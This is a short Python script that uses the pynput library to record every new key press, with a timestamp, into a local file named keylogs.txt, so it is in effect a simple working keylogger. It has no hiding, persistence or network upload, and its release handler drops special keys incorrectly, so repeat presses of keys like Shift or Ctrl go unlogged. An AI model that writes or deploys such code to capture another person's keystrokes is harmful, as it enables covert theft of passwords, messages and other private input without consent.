from pynput import keyboard
import time

# store previously pressed keys 
prev_keys = []

def on_press(key):
    try:
        k = key.char  # single-char keys
    except:
        k = str(key)  # other keys like ctrl, alt
    if k not in prev_keys:  # if it's a new press event (not an old one still stuck)
        prev_keys.append(k) 
        with open("keylogs.txt", "a") as file:
            file.write(f'{time.ctime()}: {k} \n')  # write keystroke in a time-stamped manner
    return True

def on_release(key):
    try:
        prev_keys.remove(key.char) 
    except:
        pass
    return True

# Collect events until released
with keyboard.Listener(on_press = on_press,on_release=on_release) as listener:  
      listener.join() 
